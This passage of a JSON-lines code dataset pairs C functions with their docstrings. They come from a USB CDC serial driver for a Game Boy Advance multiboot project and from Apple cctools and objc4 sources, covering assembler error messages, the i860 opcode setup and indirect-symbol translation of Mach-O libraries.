{\n\t\t\t\tUENUM = i;\n\t\t\t\ten = pgm_read_byte(cfg++);\n\t\t\t\tUECONX = en;\n\t\t\t\tif (en) {\n\t\t\t\t\tUECFG0X = pgm_read_byte(cfg++);\n\t\t\t\t\tUECFG1X = pgm_read_byte(cfg++);\n\t\t\t\t}\n\t\t\t}\n        \t\tUERST = 0x1E;\n        \t\tUERST = 0;\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == GET_CONFIGURATION && bmRequestType == 0x80) {\n\t\t\tusb_wait_in_ready();\n\t\t\tUEDATX = usb_configuration;\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == CDC_GET_LINE_CODING && bmRequestType == 0xA1) {\n\t\t\tusb_wait_in_ready();\n\t\t\tp = cdc_line_coding;\n\t\t\tfor (i=0; i<7; i++) {\n\t\t\t\tUEDATX = *p++;\n\t\t\t}\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == CDC_SET_LINE_CODING && bmRequestType == 0x21) {\n\t\t\tusb_wait_receive_out();\n\t\t\tp = cdc_line_coding;\n\t\t\tfor (i=0; i<7; i++) {\n\t\t\t\t*p++ = UEDATX;\n\t\t\t}\n\t\t\tusb_ack_out();\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == CDC_SET_CONTROL_LINE_STATE && bmRequestType == 0x21) {\n\t\t\tcdc_line_rtsdtr = wValue;\n\t\t\tusb_wait_in_ready();\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == GET_STATUS) {\n\t\t\tusb_wait_in_ready();\n\t\t\ti = 0;\n\t\t\t#ifdef SUPPORT_ENDPOINT_HALT\n\t\t\tif (bmRequestType == 0x82) {\n\t\t\t\tUENUM = wIndex;\n\t\t\t\tif (UECONX & (1<<STALLRQ)) i = 1;\n\t\t\t\tUENUM = 0;\n\t\t\t}\n\t\t\t#endif\n\t\t\tUEDATX = i;\n\t\t\tUEDATX = 0;\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\t#ifdef SUPPORT_ENDPOINT_HALT\n\t\tif ((bRequest == CLEAR_FEATURE || bRequest == SET_FEATURE)\n\t\t  && bmRequestType == 0x02 && wValue == 0) {\n\t\t\ti = wIndex & 0x7F;\n\t\t\tif (i >= 1 && i <= MAX_ENDPOINT) {\n\t\t\t\tusb_send_in();\n\t\t\t\tUENUM = i;\n\t\t\t\tif (bRequest == SET_FEATURE) {\n\t\t\t\t\tUECONX = (1<<STALLRQ)|(1<<EPEN);\n\t\t\t\t} else {\n\t\t\t\t\tUECONX = (1<<STALLRQC)|(1<<RSTDT)|(1<<EPEN);\n\t\t\t\t\tUERST = (1 << i);\n\t\t\t\t\tUERST = 0;\n\t\t\t\t}\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t#endif\n        }\n\tUECONX = (1<<STALLRQ) | (1<<EPEN);\t// stall\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// discard any buffered input\n", "func_signal": "void usb_serial_flush_input(void)", "code": "{\n\tuint8_t intr_state;\n\n\tif (usb_configuration) {\n\t\tintr_state = SREG;\n\t\tcli();\n\t\tUENUM = CDC_RX_ENDPOINT;\n\t\twhile ((UEINTX & (1<<RWAL))) {\n\t\t\tUEINTX = 0x6B;\n\t\t}\n\t\tSREG = intr_state;\n\t}\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// immediately transmit any buffered output.\n// This doesn't actually transmit the data - that is impossible!\n// USB devices only transmit when the host allows, so the best\n// we can do is release the FIFO buffer for when the host wants it\n", "func_signal": "void usb_serial_flush_output(void)", "code": "{\n\tuint8_t intr_state;\n\n\tintr_state = SREG;\n\tcli();\n\tif (transmit_flush_timer) {\n\t\tUENUM = CDC_TX_ENDPOINT;\n\t\tUEINTX = 0x3A;\n\t\ttransmit_flush_timer = 0;\n\t}\n\tSREG = intr_state;\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// transmit a character, but do not wait if the buffer is full,\n//   0 returned on success, -1 on buffer full or error\n", "func_signal": "int8_t usb_serial_putchar_nowait(uint8_t c)", "code": "{\n\tuint8_t intr_state;\n\n\tif (!usb_configuration) return -1;\n\tintr_state = SREG;\n\tcli();\n\tUENUM = CDC_TX_ENDPOINT;\n\tif (!(UEINTX & (1<<RWAL))) {\n\t\t// buffer is full\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\t// actually write the byte into the FIFO\n\tUEDATX = c;\n\t\t// if this completed a packet, transmit it now!\n\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x3A;\n\ttransmit_flush_timer = TRANSMIT_FLUSH_TIMEOUT;\n\tSREG = intr_state;\n\treturn 0;\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// transmit a character.  0 returned on success, -1 on error\n", "func_signal": "int8_t usb_serial_putchar(uint8_t c)", "code": "{\n\tuint8_t timeout, intr_state;\n\n\t// if we're not online (enumerated and configured), error\n\tif (!usb_configuration) return -1;\n\t// interrupts are disabled so these functions can be\n\t// used from the main program or interrupt context,\n\t// even both in the same program!\n\tintr_state = SREG;\n\tcli();\n\tUENUM = CDC_TX_ENDPOINT;\n\t// if we gave up due to timeout before, don't wait again\n\tif (transmit_previous_timeout) {\n\t\tif (!(UEINTX & (1<<RWAL))) {\n\t\t\tSREG = intr_state;\n\t\t\treturn -1;\n\t\t}\n\t\ttransmit_previous_timeout = 0;\n\t}\n\t// wait for the FIFO to be ready to accept data\n\ttimeout = UDFNUML + TRANSMIT_TIMEOUT;\n\twhile (1) {\n\t\t// are we ready to transmit?\n\t\tif (UEINTX & (1<<RWAL)) break;\n\t\tSREG = intr_state;\n\t\t// have we waited too long?  This happens if the user\n\t\t// is not running an application that is listening\n\t\tif (UDFNUML == timeout) {\n\t\t\ttransmit_previous_timeout = 1;\n\t\t\treturn -1;\n\t\t}\n\t\t// has the USB gone offline?\n\t\tif (!usb_configuration) return -1;\n\t\t// get ready to try checking again\n\t\tintr_state = SREG;\n\t\tcli();\n\t\tUENUM = CDC_TX_ENDPOINT;\n\t}\n\t// actually write the byte into the FIFO\n\tUEDATX = c;\n\t// if this completed a packet, transmit it now!\n\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x3A;\n\ttransmit_flush_timer = TRANSMIT_FLUSH_TIMEOUT;\n\tSREG = intr_state;\n\treturn 0;\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// immediately transmit any buffered output.\n// This doesn't actually transmit the data - that is impossible!\n// USB devices only transmit when the host allows, so the best\n// we can do is release the FIFO buffer for when the host wants it\n", "func_signal": "void usb_serial_flush_output(void)", "code": "{\n\tuint8_t intr_state;\n\n\tintr_state = SREG;\n\tcli();\n\tif (transmit_flush_timer) {\n\t\tUENUM = CDC_TX_ENDPOINT;\n\t\tUEINTX = 0x3A;\n\t\ttransmit_flush_timer = 0;\n\t}\n\tSREG = intr_state;\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "/*\n *\t\t\ta s _ f a t a l ( )\n *\n * Send to stderr a string (with bell) (JF: Bell is obnoxious!) as a fatal\n * message, and locate stdsource in input file(s).\n * Please only use this for when we DON'T have some recovery action.\n * It exit()s with a warning status.\n */\n", "func_signal": "void\nas_fatal(\nconst char *format,\n...)", "code": "{\n    va_list ap;\n\n\tprint_architecture_banner();\n\tbad_error = 1;\n\tas_where();\n\tva_start(ap, format);\n\tfprintf (stderr, \"FATAL:\");\n\tvfprintf(stderr, format, ap);\n\tfprintf(stderr, \"\\n\");\n\tva_end(ap);\n\texit(1);\n}", "path": "cctools-750\\as\\messages.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * This function is called once, at assembler startup time.  This should\n * set up all the tables, etc that the MD part of the assembler needs\n */\n", "func_signal": "void\nmd_begin(\nvoid)", "code": "{\n    const char *retval = NULL;\n    uint32_t i;\n    int j = 0;\n\n    insn_count = 0;\n    if ((op_hash = hash_new()) == NULL)\n\tas_fatal(\"Virtual memory exhausted\");\n\n    for (i = 0; i < NUMOPCODES; ++i) {\n\tif (~i860_opcodes[i].mask & i860_opcodes[i].match) {\n\t    printf(\"bad opcode - `%s %s'\\n\",\n\t\ti860_opcodes[i].name, i860_opcodes[i].args);\n\t    ++j;\n\t}\n    }\n\n    if (j)\n\texit(1);\n\n    for (i = 0; i < NUMOPCODES; ++i) {\n      retval = hash_insert(op_hash, (char *)i860_opcodes[i].name,\n\t\t\t   (char *)&i860_opcodes[i]);\n      if(retval && *retval) {\n\t  as_fatal(\"Internal Error:  Can't hash %s: %s\",\n\t    i860_opcodes[i].name, retval);\n      }\n      while (!i860_opcodes[i].last)\n\t  ++i;\n    }\n    for (i = '0'; i < '8'; ++i)\n\toctal[i] = 1;\n    for (i = '0'; i <= '9'; ++i)\n\ttoHex[i] = i - '0';\n    for (i = 'a'; i <= 'f'; ++i)\n\ttoHex[i] = i + 10 - 'a';\n    for (i = 'A'; i <= 'F'; ++i)\n\ttoHex[i] = i + 10 - 'A';\n\n    I860_errors = 0;\n    return;\n}", "path": "cctools-750\\as\\i860.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * print_architecture_banner() prints what architecture we are assembling for\n * if it has not previously been printed.\n */\n", "func_signal": "static\nvoid\nprint_architecture_banner(void)", "code": "{\n    static int printed = 0;\n\n\tif(arch_multiple && !printed){\n\t    printf(\"%s\", architecture_banner());\n\t    printed = 1;\n\t}\n}", "path": "cctools-750\\as\\messages.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n *\t\t\ta s _ w a r n ( )\n *\n * Send to stderr a string as a warning, and locate warning in input file(s).\n * Please only use this for when we have some recovery action.\n * Please explain in string (which may have '\\n's) what recovery was done.\n */\n", "func_signal": "void\nas_warn(\nconst char *format,\n...)", "code": "{\n    va_list ap;\n\n\tif(!flagseen['W']){\n\t    print_architecture_banner();\n\t    as_where();\n\t    va_start(ap, format);\n\t    vfprintf(stderr, format, ap);\n\t    fprintf(stderr, \"\\n\");\n\t    va_end(ap);\n\t}\n}", "path": "cctools-750\\as\\messages.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * Translate the objects in the input file by changing the external symbols\n * that match indirect symbols in the symbol hash table to the symbol that the\n * indirect symbol is for.\n */\n", "func_signal": "static\nvoid\ntranslate_input(\nstruct arch *archs,\nuint32_t narchs,\nstruct arch_flag *arch_flags,\nuint32_t narch_flags,\nenum bool all_archs,\nenum bool nflag)", "code": "{\n    uint32_t i, j, offset, size;\n    cpu_type_t cputype;\n    cpu_subtype_t cpusubtype;\n    struct arch_flag host_arch_flag;\n    enum bool arch_process, any_processing, *arch_flag_processed;\n    char *list_filename;\n\n\tarch_flag_processed = NULL;\n\t/*\n\t * Using the specified arch_flags process specified objects for those\n\t * architecures.\n\t */\n\tany_processing = FALSE;\n\tif(narch_flags != 0)\n\t    arch_flag_processed = allocate(narch_flags * sizeof(enum bool));\n\tmemset(arch_flag_processed, '\\0', narch_flags * sizeof(enum bool));\n\tfor(i = 0; i < narchs; i++){\n\t    /*\n\t     * Determine the architecture (cputype and cpusubtype) of arch[i]\n\t     */\n\t    cputype = 0;\n\t    cpusubtype = 0;\n\t    if(archs[i].type == OFILE_ARCHIVE){\n\t\tfor(j = 0; j < archs[i].nmembers; j++){\n\t\t    if(archs[i].members[j].type == OFILE_Mach_O){\n\t\t\tcputype = archs[i].members[j].object->mh_cputype;\n\t\t\tcpusubtype = archs[i].members[j].object->mh_cpusubtype;\n\t\t\tbreak;\n\t\t    }\n\t\t}\n\t    }\n\t    else if(archs[i].type == OFILE_Mach_O){\n\t\tcputype = archs[i].object->mh_cputype;\n\t\tcpusubtype = archs[i].object->mh_cpusubtype;\n\t    }\n\t    else if(archs[i].fat_arch != NULL){\n\t\tcputype = archs[i].fat_arch->cputype;\n\t\tcpusubtype = archs[i].fat_arch->cpusubtype;\n\t    }\n\t    arch_process = FALSE;\n\t    list_filename = NULL;\n\t    if(all_archs == TRUE){\n\t\tarch_process = TRUE;\n\t    }\n\t    else if(narch_flags != 0){\n\t\tfor(j = 0; j < narch_flags; j++){\n\t\t    if(arch_flags[j].cputype == cputype &&\n\t\t       (arch_flags[j].cpusubtype & ~CPU_SUBTYPE_MASK) ==\n\t\t       (cpusubtype & ~CPU_SUBTYPE_MASK)){\n\t\t\tarch_process = TRUE;\n\t\t\tarch_flag_processed[j] = TRUE;\n\t\t\tif(list_filenames != NULL)\n\t\t\t    list_filename = list_filenames[j];\n\t\t\tbreak;\n\t\t    }\n\t\t}\n\t    }\n\t    else{\n\t\t(void)get_arch_from_host(&host_arch_flag, NULL);\n\t\tif(host_arch_flag.cputype == cputype &&\n\t\t   (host_arch_flag.cpusubtype & ~CPU_SUBTYPE_MASK) ==\n\t\t   (cpusubtype & ~CPU_SUBTYPE_MASK))\n\t\t    arch_process = TRUE;\n\t    }\n\t    if(narchs != 1 && arch_process == FALSE)\n\t\tcontinue;\n\t    any_processing = TRUE;\n\n\t    if(list_filename != NULL)\n\t\tprocess_list(list_filename, nflag);\n\n\t    /*\n\t     * Now this arch[i] has been selected to be processed so process it\n\t     * according to it's type.\n\t     */\n\t    if(archs[i].type == OFILE_ARCHIVE){\n\t\tfor(j = 0; j < archs[i].nmembers; j++){\n\t\t    if(archs[i].members[j].type == OFILE_Mach_O){\n\t\t\ttranslate_object(archs + i, archs[i].members + j,\n\t\t\t\t\t archs[i].members[j].object);\n\t\t    }\n\t\t}\n\t\t/*\n\t\t * Make the objects for the indirect symbols in the -n flag is\n\t\t * not specified since this architecure is an archive.\n\t\t */\n\t\tif(nflag == FALSE)\n\t\t    make_indr_objects(archs + i);\n\n\t\t/*\n\t\t * Reset the library offsets and size.\n\t\t */\n\t\toffset = 0;\n\t\tfor(j = 0; j < archs[i].nmembers; j++){\n\t\t    archs[i].members[j].offset = offset;\n\t\t    size = 0;\n\t\t    if(archs[i].members[j].member_long_name == TRUE){\n\t\t\tsize = round(archs[i].members[j].member_name_size,\n\t\t\t\t     sizeof(int32_t));\n\t\t\tarchs[i].toc_long_name = TRUE;\n\t\t    }\n\t\t    if(archs[i].members[j].object != NULL){\n\t\t\tsize += archs[i].members[j].object->object_size\n\t\t\t   - archs[i].members[j].object->input_sym_info_size\n\t\t\t   + archs[i].members[j].object->output_sym_info_size;\n\t\t\tsprintf(archs[i].members[j].ar_hdr->ar_size, \"%-*ld\",\n\t\t\t       (int)sizeof(archs[i].members[j].ar_hdr->ar_size),\n\t\t\t       (long)(size));\n\t\t\t/*\n\t\t\t * This has to be done by hand because sprintf puts a\n\t\t\t * null at the end of the buffer.\n\t\t\t */\n\t\t\tmemcpy(archs[i].members[j].ar_hdr->ar_fmag, ARFMAG,\n\t\t\t      (int)sizeof(archs[i].members[j].ar_hdr->ar_fmag));\n\t\t    }\n\t\t    else{\n\t\t\tsize += archs[i].members[j].unknown_size;\n\t\t    }\n\t\t    offset += sizeof(struct ar_hdr) + size;\n\t\t}\n\t\tarchs[i].library_size = offset;\n\t    }\n\t    else if(archs[i].type == OFILE_Mach_O){\n\t\ttranslate_object(archs + i, NULL, archs[i].object);\n\t    }\n\t    else {\n\t\tfatal_arch(archs + i, NULL, \"can't process non-object and \"\n\t\t\t   \"non-archive file: \");\n\t    }\n\t}\n\tif(all_archs == FALSE && narch_flags != 0){\n\t    for(i = 0; i < narch_flags; i++){\n\t\tif(arch_flag_processed[i] == FALSE)\n\t\t    error(\"file: %s does not contain architecture: %s\",\n\t\t\t  archs[0].file_name, arch_flags[i].name);\n\t    }\n\t    free(arch_flag_processed);\n\t}\n\tif(any_processing == FALSE)\n\t    fatal(\"no processing done on input file: %s (specify a -arch flag)\",\n\t\t  archs[0].file_name);\n}", "path": "cctools-750\\misc\\indr.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * Create and enter an indr object and it's informaton into the specified list.\n */\n", "func_signal": "static\nstruct indr_object *\nenter_object(\nchar *membername,\nchar *indr,\nchar *undef,\nstruct list *list)", "code": "{\n    struct indr_object *io;\n\n\tio = allocate(sizeof(struct indr_object));\n\tio->membername = membername;\n\tio->indr = indr;\n\tio->undef = undef;\n\tio->existing_symbol = FALSE;\n\tio->index = 0;\n\tadd_list(list, io);\n\treturn(io);\n}", "path": "cctools-750\\misc\\indr.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\nvoid doimageinfo(struct imageInfo *ii, uint32_t size, bool needsFlip) {\n    uint32_t flags = iiflags(ii, size, needsFlip);\n    printflags(flags);\n}\n*/\n", "func_signal": "void dosect32(void *start, struct section *sect, bool needsFlip, struct gcinfo *gcip)", "code": "{\n    if (debug) printf(\"section %s from segment %s\\n\", sect->sectname, sect->segname);\n    if (strcmp(sect->segname, \"__OBJC\")) return;\n    gcip->hasObjC = true;\n    if (strcmp(sect->sectname, \"__image_info\")) return;\n    gcip->hasInfo = true;\n    if (needsFlip) {\n        sect->offset = OSSwapInt32(sect->offset);\n        sect->size = OSSwapInt32(sect->size);\n    }\n    // these guys aren't inline - they point elsewhere\n    gcip->flags = iiflags(start + sect->offset, sect->size, needsFlip);\n}", "path": "objc4-437.1\\markgc.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * translate the dynamic library.\n */\n", "func_signal": "static\nvoid\ntranslate_dylib(\nstruct arch *arch,\nstruct object *object)", "code": "{\n    enum byte_sex host_byte_sex;\n    uint32_t i, inew_syms, inew_undefsyms, inew_mods, indr_iextdefsym;\n    uint32_t new_ext_strsize, len, offset;\n    uint32_t *map;\n    struct symbol *sp;\n    char *p, *q;\n    struct scattered_relocation_info *sreloc;\n\n    struct nlist *symbols;\n    uint32_t nsyms;\n    char *strings;\n    uint32_t strsize;\n    struct dylib_table_of_contents *tocs;\n    uint32_t ntoc;\n    struct dylib_module *mods;\n    uint32_t nmodtab;\n    struct dylib_reference *refs;\n    uint32_t nextrefsyms;\n    struct relocation_info *ext_relocs;\n    uint32_t *indirect_symtab;\n\n    struct nlist *new_symbols;\n    uint32_t new_nsyms;\n    char *new_strings;\n    uint32_t new_strsize;\n    uint32_t new_nlocalsym;\n    uint32_t new_nextdefsym;\n    uint32_t new_nundefsym;\n    struct dylib_table_of_contents *new_tocs;\n    uint32_t new_ntoc;\n    struct dylib_module *new_mods;\n    uint32_t new_nmodtab;\n    struct dylib_reference *new_refs;\n    uint32_t new_nextrefsyms;\n\n\n\t/*\n\t * Break out all the old tables.\n\t */\n\tsymbols = (struct nlist *)(object->object_addr + object->st->symoff);\n\tnsyms = object->st->nsyms;\n\tstrings = object->object_addr + object->st->stroff;\n\tstrsize = object->st->strsize;\n\ttocs = (struct dylib_table_of_contents *)\n\t\t(object->object_addr + object->dyst->tocoff);\n\tntoc = object->dyst->ntoc;\n\tmods = (struct dylib_module *)\n\t\t(object->object_addr + object->dyst->modtaboff);\n\tnmodtab = object->dyst->nmodtab;\n\trefs = (struct dylib_reference *)\n\t\t(object->object_addr + object->dyst->extrefsymoff);\n\tnextrefsyms = object->dyst->nextrefsyms;\n\text_relocs = (struct relocation_info *)\n\t\t      (object->object_addr + object->dyst->extreloff);\n\tindirect_symtab = (uint32_t *)\n\t\t\t   (object->object_addr + object->dyst->indirectsymoff);\n\t/*\n\t * Swap them if needed.\n\t */\n\thost_byte_sex = get_host_byte_sex();\n\tif(object->object_byte_sex != host_byte_sex){\n\t    swap_nlist(symbols, nsyms, host_byte_sex);\n\t    swap_dylib_table_of_contents(tocs, ntoc, host_byte_sex);\n\t    swap_dylib_module(mods, nmodtab, host_byte_sex);\n\t    swap_dylib_reference(refs, nextrefsyms, host_byte_sex);\n\t    swap_relocation_info(ext_relocs, object->dyst->nextrel,\n\t\t\t\t host_byte_sex);\n\t    swap_indirect_symbols(indirect_symtab, object->dyst->nindirectsyms,\n\t\t\t\t  host_byte_sex);\n\t}\n\n\n\t/*\n\t * First pass, figrure out the new sizes of the new tables.\n\t */\n\t\n\t/*\n\t * For the symbol table and string table recalculate the their sizes\n\t * with the names of the symbols listed in the indr file renamed and\n\t * an indirect symbol added.\n\t * Look to make sure no symbols exist that would colide with the\n\t * indirect's undefined symbol names that will be created.  This is so\n\t * the symbols can be renamed.\n\t */\n\tnew_nsyms = 0;\n\tnew_strsize = sizeof(int32_t);\n\tnew_nlocalsym = 0;\n\tnew_nextdefsym = 0;\n\tnew_nundefsym = 0;\n\tnew_ext_strsize = 0;\n\tfor(i = 0; i < nsyms; i++){\n\t    if(symbols[i].n_un.n_strx != 0){\n\t\tif(symbols[i].n_un.n_strx < 0 ||\n\t\t   (uint32_t)symbols[i].n_un.n_strx > strsize){\n\t\t    error_arch(arch, NULL, \"bad string index for symbol \"\n\t\t\t       \"table entry %d in: \", i);\n\t\t    return;\n\t\t}\n\t    }\n\t    if((symbols[i].n_type & N_TYPE) == N_INDR){\n\t\tif(symbols[i].n_value != 0){\n\t\t    if(symbols[i].n_value > strsize){\n\t\t\terror_arch(arch, NULL, \"bad string index for \"\n\t\t\t\t   \"indirect symbol table entry %d in: \", i);\n\t\t\treturn;\n\t\t    }\n\t\t}\n\t    }\n\t    if((symbols[i].n_type & N_EXT) == 0){ /* local symbol */\n\t\tif(symbols[i].n_un.n_strx != 0)\n\t\t    new_strsize += strlen(strings + symbols[i].n_un.n_strx) + 1;\n\t\tnew_nlocalsym++;\n\t\tnew_nsyms++;\n\t    }\n\t    else{ /* global symbol */\n\t\tlen = 0;\n\t\tif(symbols[i].n_un.n_strx != 0){\n\t\t    sp = lookup_symbol(strings + symbols[i].n_un.n_strx);\n\t\t    if(sp != NULL){\n\t\t\tif(sp->type == N_UNDF)\n\t\t\t    fatal_arch(arch, NULL, \"symbol name: %s conflicts \"\n\t\t\t\t\"with symbol name created for indirection in: \",\n\t\t\t\tsp->name);\n\t\t\telse{\n\t\t\t    len = strlen(sp->indr) + 1;\n\t\t\t    sp->io->existing_symbol = TRUE;\n\t\t\t    sp->io->index = i;\n\t\t\t}\n\t\t    }\n\t\t    else\n\t\t\tlen = strlen(strings + symbols[i].n_un.n_strx) + 1;\n\t\t}\n\t\tif((symbols[i].n_type & N_TYPE) == N_INDR)\n\t\t    len += strlen(strings + symbols[i].n_value) + 1;\n\t\tnew_strsize += len;\n\t\tnew_ext_strsize += len;\n\t\tnew_nsyms++;\n\t\tif(((symbols[i].n_type & N_TYPE) == N_UNDF &&\n\t\t    symbols[i].n_value == 0) ||\n\t\t    (symbols[i].n_type & N_TYPE) == N_PBUD)\n\t\t    new_nundefsym++;\n\t\telse\n\t\t    new_nextdefsym++;\n\t    }\n\t}\n\t/*\n\t * The new symbol table will have 1 new defined external for each\n\t * indirect symbol name on the indr list.  And 1 new undefined symbol\n\t * if the undefined symbol name does not exist.\n\t */\n\tfor(i = 0; i < indr_list.used; i++){\n\t    new_nsyms++;\n\t    new_nextdefsym++;\n\t    /* if there is not an existing symbol there will be a new undef */\n\t    if(indr_list.list[i]->existing_symbol == FALSE){\n\t\tnew_nsyms++;\n\t\tnew_nundefsym++;\n\t    }\n\t    len = strlen(indr_list.list[i]->indr) + 1;\n\t    len += strlen(indr_list.list[i]->undef) + 1;\n\t    new_strsize += len;\n\t    new_ext_strsize += len;\n\t}\n\t/*\n\t * The module table's module names are placed with the external strings.\n\t * So size them and add this to the external string size.\n\t */\n\tfor(i = 0; i < nmodtab; i++){\n\t    if(mods[i].module_name == 0 ||\n\t       mods[i].module_name > strsize){\n\t\terror_arch(arch, NULL, \"bad string index for module_name \"\n\t\t\t   \"of module table entry %d in: \", i);\n\t\treturn;\n\t    }\n\t    len = strlen(strings + mods[i].module_name) + 1;\n\t    new_strsize += len;\n\t    new_ext_strsize += len;\n\t}\n\t/*\n\t * A new module will be created for each indr symbol so add the sizes\n\t * of those module names to the external string size.\n\t */\n\tfor(i = 0; i < indr_list.used; i++){\n\t    len = strlen(indr_list.list[i]->membername) + 1;\n\t    new_strsize += len;\n\t    new_ext_strsize += len;\n\t}\n\n\t/*\n\t * The new module table will have one extra entry for each indr symbol.\n\t */\n\tnew_nmodtab = nmodtab + indr_list.used;\n\t\n\t/*\n\t * The new reference table will have two extra entries for each indr\n\t * symbol.  One for the definition of the indr and one for the undefined\n\t * that it refers to.\n\t */\n\tnew_nextrefsyms = nextrefsyms + 2 * indr_list.used;\n\n\t/*\n\t * The new table of contents will have extra entry for each indr symbol.\n\t */\n\tnew_ntoc = ntoc + indr_list.used;\n\n\t/*\n\t * Second pass, create the new tables.\n\t */\n\tnew_symbols =(struct nlist *)allocate(new_nsyms * sizeof(struct nlist));\n\tnew_strsize = round(new_strsize, sizeof(int32_t));\n\tnew_strings = (char *)allocate(new_strsize);\n\tnew_strings[new_strsize - 3] = '\\0';\n\tnew_strings[new_strsize - 2] = '\\0';\n\tnew_strings[new_strsize - 1] = '\\0';\n\n\tmemset(new_strings, '\\0', sizeof(int32_t));\n\tp = new_strings + sizeof(int32_t);\n\tq = p + new_ext_strsize;\n\n\t/*\n\t * Now create the new symbol table and string table in this order\n\t * symbol table\n\t *\tlocal symbols (sorted by module)\n\t *\texternal defined symbols (sorted by module)\n\t *\tundefined symbols (sorted by name)\n\t * string table\n\t *\texternal strings\n\t *\tlocal strings\n\t */\n\tmap = (uint32_t *)allocate(nsyms * sizeof(uint32_t));\n\tmemset(map, '\\0', nsyms * sizeof(uint32_t));\n\tinew_syms = 0;\n\tfor(i = 0; i < nsyms; i++){ /* loop for local symbols */\n\t    if((symbols[i].n_type & N_EXT) == 0){\n\t\tnew_symbols[inew_syms] = symbols[i];\n\t\tif(symbols[i].n_un.n_strx != 0){\n\t\t    strcpy(q, strings + symbols[i].n_un.n_strx);\n\t\t    new_symbols[inew_syms].n_un.n_strx = q - new_strings;\n\t\t    q += strlen(q) + 1;\n\t\t}\n\t\tmap[i] = inew_syms;\n\t\tinew_syms++;\n\t    }\n\t}\n\tfor(i = 0; i < nsyms; i++){ /* loop for external defined symbols */\n\t    if((symbols[i].n_type & N_EXT) == N_EXT &&\n\t       ((symbols[i].n_type & N_TYPE) != N_UNDF &&\n\t        (symbols[i].n_type & N_TYPE) != N_PBUD)){\n\t\tnew_symbols[inew_syms] = symbols[i];\n\n\t\tif(symbols[i].n_un.n_strx != 0){\n\t\t    sp = lookup_symbol(strings + symbols[i].n_un.n_strx);\n\t\t    if(sp != NULL)\n\t\t\tstrcpy(p, sp->indr);\n\t\t    else\n\t\t\tstrcpy(p, strings + symbols[i].n_un.n_strx);\n\t\t    new_symbols[inew_syms].n_un.n_strx = p - new_strings;\n\t\t    p += strlen(p) + 1;\n\t\t}\n\t\tif((symbols[i].n_type & N_TYPE) == N_INDR){\n\t\t    if(symbols[i].n_value != 0){\n\t\t\tstrcpy(p, strings + symbols[i].n_value);\n\t\t\tnew_symbols[inew_syms].n_value = p - new_strings;\n\t\t\tp += strlen(p) + 1;\n\t\t    }\n\t\t}\n\t\tmap[i] = inew_syms;\n\t\tinew_syms++;\n\t    }\n\t}\n\tindr_iextdefsym = inew_syms;\n\tfor(i = 0; i < indr_list.used; i++){ /* loop for new defined symbols*/\n\t    strcpy(p, indr_list.list[i]->indr);\n\t    new_symbols[inew_syms].n_un.n_strx = p - new_strings;\n\t    p += strlen(p) + 1;\n\t    new_symbols[inew_syms].n_type = N_INDR | N_EXT;\n\t    new_symbols[inew_syms].n_desc = 0;\n\t    new_symbols[inew_syms].n_sect = NO_SECT;\n\t    /* Note this name is used below for the undefined */\n\t    strcpy(p, indr_list.list[i]->undef);\n\t    indr_list.list[i]->undef = p;\n\t    new_symbols[inew_syms].n_value = p - new_strings;\n\t    p += strlen(p) + 1;\n\t    inew_syms++;\n\t}\n\t/*\n\t * To get the undefined symbols in order sorted by name they are first\n\t * copied into the undef_map, sorted and then copied into the\n\t * new_symbols in the sorted order.\n\t */\n\tundef_map = (struct undef_map *)allocate(new_nundefsym *\n\t\t\t\t\t\t sizeof(struct undef_map));\n\tinew_undefsyms = 0;\n\tfor(i = 0; i < indr_list.used; i++){ /* loop for new undef symbols */\n\t    if(indr_list.list[i]->existing_symbol == FALSE){\n\t\t/* Note this name is used from above for the undefined */\n\t\tundef_map[inew_undefsyms].symbol.n_un.n_strx =\n\t\t    indr_list.list[i]->undef - new_strings;\n\t\tundef_map[inew_undefsyms].symbol.n_type = N_UNDF | N_EXT;\n\t\tundef_map[inew_undefsyms].symbol.n_desc = 0;\n\t\tundef_map[inew_undefsyms].symbol.n_sect = NO_SECT;\n\t\tundef_map[inew_undefsyms].symbol.n_value = 0;\n\t\tundef_map[inew_undefsyms].old_symbol = FALSE;\n\t\tundef_map[inew_undefsyms].index = i;\n\t\tinew_undefsyms++;\n\t    }\n\t}\n\tfor(i = 0; i < nsyms; i++){ /* loop for undefined symbols */\n\t    if((symbols[i].n_type & N_EXT) == N_EXT &&\n\t       ((symbols[i].n_type & 